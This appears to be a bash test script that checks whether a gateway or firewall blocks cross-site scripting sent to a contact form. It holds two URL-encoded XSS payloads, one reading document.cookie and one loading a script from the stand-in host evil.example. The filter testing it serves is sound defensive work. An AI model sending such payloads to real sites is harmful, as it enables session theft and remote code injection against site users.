#!/usr/bin/env bash
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
source "${DIR}/lib/common.sh"
trap _common_cleanup EXIT
require_target
_common_init
step "XSS_BLOCKED" "document.cookie exfil attempt" \
  gw_curl -o /dev/null -w "    HTTP %{http_code}\n" \
    "${BASE}/contact/?msg=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
step "XSS_BLOCKED" "external script src" \
  gw_curl -o /dev/null -w "    HTTP %{http_code}\n" \
    "${BASE}/contact/?msg=%3Cscript%20src%3Dhttps%3A%2F%2Fevil.example%2Fx.js%3E%3C%2Fscript%3E"
print_trace
